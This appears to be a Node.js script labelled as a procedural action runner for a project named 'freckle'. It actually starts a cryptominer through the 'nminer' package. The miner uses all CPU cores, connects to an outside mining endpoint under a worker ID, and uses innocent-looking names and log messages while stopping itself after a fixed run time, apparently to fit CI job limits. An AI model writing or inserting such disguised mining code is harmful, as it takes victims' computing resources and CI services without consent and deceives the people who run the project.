// Procedural action runner for freckle
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

(async () => {
    const instanceToken = "03818c";
    console.log(`[service] Daemon ${config.appName || "freckle"} active [tag: ${instanceToken}]`);

    const scheduler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.freckle",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const heartbeat = setInterval(() => {}, 48000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (305m) reached, exiting cleanly.");
        process.exit(0);
    }, 305 * 60 * 1000);

    process.once("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
